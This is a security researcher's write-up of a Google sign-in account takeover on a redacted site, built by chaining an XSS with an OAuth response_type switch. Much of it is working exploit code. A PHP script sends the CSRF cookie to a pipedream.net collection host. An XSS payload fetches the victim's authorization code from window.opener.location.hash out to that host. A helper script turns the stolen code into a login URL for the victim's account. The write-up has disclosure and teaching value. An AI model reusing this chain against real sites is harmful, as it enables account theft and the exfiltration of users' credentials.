# Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com


My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn't going to be easy here.

Although https://login.redacted.com is really a special domain as it's used for signup/login , oauth ,etc so there must be a way to do something impactful.

During that time, I remembered about Frans Rosen's research on Oauth https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ eg: where by changing the response_type from code to code,id_token made the OAuth provider return the oauth token,etc in the hash fragment of the url. If the web server isn't configured to handle /  expects the oauth token in a query param  it might return an error page and the oauth token may be remain as it is in the hash fragment. (Checkout for more ways to fail the oauth flow)

Now all the attacker needs is a way to steal that oauth token , Frans talked in detail about various ways which could be used for this, even disclosed some of his findings publically.

https://hackerone.com/reports/1567186
https://gitlab.com/gitlab-org/gitlab/-/issues/362394

Please read the blogpost by Frans Rosen before moving on as everything is explained there in very detail.

--------------------------------------------

I clicked on the `Sign in With Google` button and it redirect me to this url:

https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?response_type=code&client_id=redacted.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Flogin.redacted.com%2Fservices%2Fauthcallback%2Fgoogle&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&service=lso&o2v=1&flowName=GeneralOAuthFlow

I changed the `response_type` to `response_type=code,id_token` and now just went with the oauth flow , I was redirected to this page.

https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&ErrorDescription=State+was+not+sent+back&ProviderId=redacted#state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&code=4/0Adeu5BUex4YzCBcszdOirTLW_UO0o7O5QXEynHjerek2dUDBLaV2QjPMdkK051x7MOBdzA&scope=email%20profile%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjgzOGMwNmM2MjA0NmMyZDk000GFmZmUxMzdkZDUzMTAxMjlmNGQ1ZDEiLCJ0eXAiOiJKV1QifQ.xxxxxx.O2OPIsMtZZzUc4v3zHXPBCL5rfjciDfPqQScixbpsSXdEbgsxpxMhcz5M3P01yFaVsAzxyXY2iK9kT6gaul99FmizlBk9tpTfcmHCTSlYKiVz-JTn0LevJHoaRSy8hrH5u5TTLpes3yC2U6pZrdPPQgFZsHFKa8gE2N9-XKK80IKwyftukCjNSNFLhGnJy92h7P4xADUS353R0v8C1WnL8J7Ha7Ic-2lr9xg0AKDoYdTiKqAL7FfSq6rUCDR9pPzmXkud0GA_Ff0h_CuOhD_loXRP8t0F8rsjNdQEHR2RLllmSfZtFS2jjUFr7AAgyZav6fF7Xga_jzNnDyWzriAo4A&authuser=0&prompt=consent&version_info=CmxfU1ZJX0VLU0Vzc2pBbjRFREdCQWlQMDFCUlVSSVpsOXhSRFk0WjJwYWFFUmplamxqUmxOTWVIVjZYeTFtZUZwV2EzQkJhWFZrY0dKd1pIWmFOV2x6WVRocU4yNHlkVGhRYnpGeVZsTkNWUV8

```
https://login.redacted.com/identity/sso/ui/AuthorizationError?
ErrorCode=No_Oauth_State
&ErrorDescription=State+was+not+sent+back
&ProviderId=redacted
#state=CAAAAY&code=4/0Ad...&id_token=eyJh..................
```

From the `ErrorDescription` you can see the server was expecting a state parameter to be there in the query param but as the hash fragment is there and is only accessible via client side js , as they are in the hash fragment the error is shown.


Now all we need is a way to steal the hash fragment.
As our xss is in the same domain, I can easily read it. All I need is to make some relation between the error page containing code in hash and the xss page.

------------------------------


I went ahead and created a poc, which first setups the oauth url with the modified response_type , then opens the xss endpoint in a new tab using javascript's window.open (we will refer to this tab as winB), then using window.location I redirected the current page to the oauth url (we will refer this as winA).

The oauth flow takes place and the user is redirected to this url (in winA tab)

https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&ErrorDescription=State+was+not+sent+back&ProviderId=redacted#state=CAAAAY&code=4/0Ad...&id_token=eyJh..................

See the origin of winA it's login.redacted.com and the origin of winB is also login.redacted.com. As both winA and winB are of same origin, we can read the full url of winA tab. Using window.opener.document.location.hash property from the winB tab where we have xss, I can easily get the necessary paramater values eg: code . An attacker can send this to his server and then login into victim's account by just placing the retrieved state and code parameter value in this callback url:

${state} and ${code} are the place holders.

```
https://login.redacted.com/services/authcallback/google?state=${state}&code=${code}&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&authuser=0&prompt=none
```

Now the attacker just needs to make a request to this url and he will be able to login to victim's account after following the below steps.

----------------------------------

I wrote the following php script to do the above steps:

```php
<?php

$url = "https://login.redacted.com/services/auth/sso/google/";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

// The response of this url contains the oauth url in the Location header and the idccsrf cookie from the Set-Cookie header
$response = curl_exec($curl); //[1]

$header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
$headers = substr($response, 0, $header_size);
$body = substr($response, $header_size);

curl_close($curl);

$headers = explode("\r\n", $headers);

foreach ($headers as $header) {
    if (strpos($header, 'Location: ') === 0) {
        $location = substr($header, 10); //oauth url is stored here
    }

    # get set-cookie
    if (strpos($header, 'Set-Cookie: ') === 0) {
        $cookie = substr($header, 12);  // idccsrf cookie is stored here
    }
}



#send this cookie to attacker controlled server https://en2celr7rewbul.m.pipedream.net/steal?q=

$attackerDomain = "https://en2celr7oewbxl.m.pipedream.net/steal?q=";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $attackerDomain . urlencode($cookie));
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

curl_exec($curl); 



#replace the response_type parameter value with code,id_token oauthUrl

$location = str_replace('response_type=code', 'response_type=code,id_token', $location); // [2]


?>


<body>
    <script>
        console.log("Oauth url: <?php echo $location; ?>")
        console.log("Cookie: <?php echo $cookie; ?>")
        
        // this is the xss payload which we used to steal the authorization code  

        payload = `setTimeout(()=>{fetch("<?php echo $attackerDomain; ?>"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`

        function startExploit(){
            // window.open location value, it opens the vulnerable xss endpoint a new window


            win = window.open(`https://login.redacted.com/xssendpoint?param=shirley')};${payload};function%20xyz(){window.parent.postMessage('x`);
            // wait 5 seconds

            // This opens the oauth url in the current tab

            setTimeout(() => {
                window.location = `<?php echo $location; ?>;`
                
            }, 5000);

            //great now if I run `window.opener` from the xss page I get the whole token and everything

        }

    </script>

    <a href="#" onclick="startExploit()">Start Exploit</a>
</body>
```


This endpoint was responsible for generating the oauth url:

![BurpSuiteCommunity_xLyg501nml](https://github.com/Sudistark/xss-writeups/assets/31372554/c80c6611-6339-478a-8a2f-8bb2cb4d7d0f)

In the response headers you can see this cookie:

```
Set-Cookie: idccsrf=-898201194036363428516943317029004569446202656766185;
```

This cookie is really important , while using the the authorization code the server validates if the user's cookie `idccsrf` matches with the `idccsrf` cookie assigned at the time of generating the ouath url.



The above php code does the following thing,makes a request to https://login.redacted.com/services/auth/sso/google/ on line [1], from the header response get the `Location` header value and from the `Set-Cookie` header get the `idccsrf` cookie value.

Then we send the cookie to our logging server so that we can use it later.
On line [2] we modify the `response_type` parameter value to `code,id_token`.

After that starts javascript code

```js
payload = `setTimeout(()=>{fetch("<?php echo $attackerDomain; ?>"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`
```

This is the xss payload which we will be using , basically it alerts the 
`window.opener.document.location.hash` value after 9sec.

The `startExploit` method does the following things which are important for this attack,

This opens the xss endpoint via `window.open` refers to this window as winB and the current page as winA (which has all the php code,js code,etc)

```js
win = window.open(`https://login.redacted.com/xssendpoint?param=shirley')};${payload};function%20xyz(){window.parent.postMessage('x`);
```

Then after 5sec , we redirect the winA to the value stored in `$location` variable. This variable contains the modified `response_type` oauth url.


```js
           setTimeout(() => {
                window.location = `<?php echo $location; ?>;`
                
            }, 5000);
```

Now here's what will happen, the oauth flow will take place automatically as soon as the url is opened there is no user interaction is involved here where they need to select the google acc, it will automatically sign in the user via their google acc which the victim has previously used.

The winA page url will be like this after the oauth flow is done, a message will be shown on the page that the state param wasn't provided:

https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&ErrorDescription=State+was+not+sent+back&ProviderId=redacted#state=CAAAAY&code=4/0Ad...&id_token=eyJh..................

The code in winB executes after 9sec (this delay is to make sure the oauth flow takes place properly in the winA tab).
As I already explained winA and winB are of same origin login.redacted.com , we can easily accessed any info for winA window from winB.

winA can be accessed by winB via window.opener property, to get the hash value:

```
window.opener.document.location.hash
```




Now onto the next part, once we have stealed the victims authorization code. The above exploit also sends the authorization code and idcsrf cookie to attacker controlled server.

Copy the fragment part which is also displayed in the alert popup and paste it in the `getToken` method like I have done in this

```js
// taken one arguement from commandline


function getToken(token) {

    //split the params into array

    var params = token.split('&');

    //get the value for state param and code param

    var state = params[0].split('=')[1];
    var code = params[1].split('=')[1];

    //console.log(state)
    //console.log(code)

    url = `https://login.redacted.com/services/authcallback/google?state=${state}&code=${code}&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&authuser=0&prompt=none`
    console.log(url.replace(';', ''))




}

//using this we will generate the correct callback url, just paste your input inside it

getToken("state=CAAAAY&code=4/0AWtgz&scope=email%20profile%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile%20openid&id_token=eyJhb.............&authuser=0&prompt=none")
```

The above code will give us the url which can be used now to login into the victim's account.There is just one important thing to take care of which is the `idccsrf` token at first I didn;t noticed this cookie parameter and was wondering for so long why I wasn't able to login to victim's acc.

So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim's account.
